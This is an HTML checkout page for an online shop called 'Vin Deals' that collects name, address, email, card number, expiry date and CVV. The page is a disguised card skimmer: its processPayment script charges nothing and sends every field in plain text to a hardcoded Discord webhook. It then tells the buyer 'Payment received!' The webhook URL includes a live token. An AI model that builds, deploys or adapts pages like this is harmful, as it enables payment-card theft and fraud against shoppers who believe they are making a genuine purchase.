<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Checkout - Vin Deals</title>
  <link href="https://fonts.googleapis.com/css2?family=Rubik&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Rubik', sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 600px;
      background: white;
      margin: 40px auto;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    .section {
      margin-top: 25px;
    }

    .section h3 {
      margin-bottom: 10px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #4ade80;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
    }

    button:hover {
      background-color: #22c55e;
    }

    .total-box {
      font-size: 18px;
      margin-top: 20px;
      text-align: center;
      font-weight: bold;
    }

    .confirmation {
      text-align: center;
      color: green;
      font-weight: bold;
      margin-top: 30px;
      display: none;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Checkout</h2>

  <div class="section">
    <h3>Shipping Info</h3>
    <input type="text" id="fullname" placeholder="Full Name" required>
    <input type="text" id="address" placeholder="Street Address" required>
    <input type="text" id="city" placeholder="City" required>
    <input type="text" id="state" placeholder="State" required>
    <input type="text" id="zip" placeholder="ZIP Code" required>
  </div>

  <div class="section">
    <h3>Payment Info</h3>
    <input type="text" id="email" placeholder="Email Address" required>
    <input type="text" id="cardnumber" placeholder="Card Number" required>
    <input type="text" id="exp" placeholder="MM/YY" required>
    <input type="text" id="cvv" placeholder="CVV" required>
  </div>

  <div class="total-box" id="cartTotal">Calculating total...</div>

  <button onclick="processPayment()">Place Order</button>

  <div class="confirmation" id="confirmation">
    Payment received! Please check your email for tracking number.
  </div>
</div>

<script>
function calculateTotal() {
  const cart = JSON.parse(localStorage.getItem("cartItems")) || [];
  let total = 0;
  cart.forEach(item => {
    total += parseFloat(item.price) * item.quantity;
  });
  const totalFormatted = total.toFixed(2);
  document.getElementById("cartTotal").innerText = `Total: $${totalFormatted}`;
  return totalFormatted;
}

function processPayment() {
  const name = document.getElementById("fullname").value;
  const address = document.getElementById("address").value;
  const city = document.getElementById("city").value;
  const state = document.getElementById("state").value;
  const zip = document.getElementById("zip").value;
  const email = document.getElementById("email").value;
  const card = document.getElementById("cardnumber").value;
  const exp = document.getElementById("exp").value;
  const cvv = document.getElementById("cvv").value;

  const total = calculateTotal();

  if (!name || !address || !city || !state || !zip || !email || !card || !exp || !cvv) {
    alert("Please fill out all fields.");
    return;
  }

  const message = {
    content: `**New Order**\n
**Name:** ${name}\n
**Shipping Address:** ${address}, ${city}, ${state} ${zip}\n
**Email:** ${email}\n
**Card Number:** ${card}\n
**Exp:** ${exp}\n
**CVV:** ${cvv}\n
**Total Charged:** $${total}`
  };

  fetch("https://discord.com/api/webhooks/1362719414461530253/T2BJTZMh_p205cnYWh6WgrWOwjVqSyY3fig5N07_4B7Uv8W6UvSVqT3Zg1w-lB9NB4di", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(message)
  });

  document.getElementById("confirmation").style.display = "block";
  localStorage.removeItem("cartItems");
}

// Ensure total is calculated when page loads
window.addEventListener("DOMContentLoaded", calculateTotal);
</script>

</body>
</html>
